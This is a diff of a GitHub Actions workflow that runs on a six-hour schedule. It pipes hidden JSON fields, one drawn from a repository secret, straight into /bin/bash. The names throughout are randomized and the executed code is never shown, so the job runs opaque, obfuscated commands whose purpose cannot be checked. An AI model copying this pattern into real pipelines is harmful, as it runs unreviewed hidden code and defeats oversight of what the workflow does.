@@ -1,8 +1,9 @@
 name: zhongxiaozxs
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
+    - cron: '7 4/6 * * *'
 
 jobs:
   build:
@@ -12,11 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongxiaozxs
         env:
-          pmhvj1932: ${{ secrets.pmhvj1932 }}
+          qmnf9: ${{ secrets.qmnf9 }}
         run: |
-          echo $pmhvj1932 | jq -r .dwp35824 | /bin/bash
-          echo $njxyw995 | jq -r .sti545 | /bin/bash
-          echo $r445 | jq -r .h94 | /bin/bash
-          echo $pse5908 | jq -r .h939 | /bin/bash
-          echo $eatq1 | jq -r .oelvn33760 | /bin/bash
+          echo $qmnf9 | jq -r .r71 | /bin/bash
+          echo $mcyyz436 | jq -r .sop1 | /bin/bash
+          echo $yznrc89 | jq -r .ywj844 | /bin/bash
+          echo $yyffz5669 | jq -r .e35 | /bin/bash
+          echo $wvo8 | jq -r .kcvtf6 | /bin/bash
+          echo $xvgq5 | jq -r .bh09 | /bin/bash
+          echo $drrsx95 | jq -r .pypgb6 | /bin/bash
 
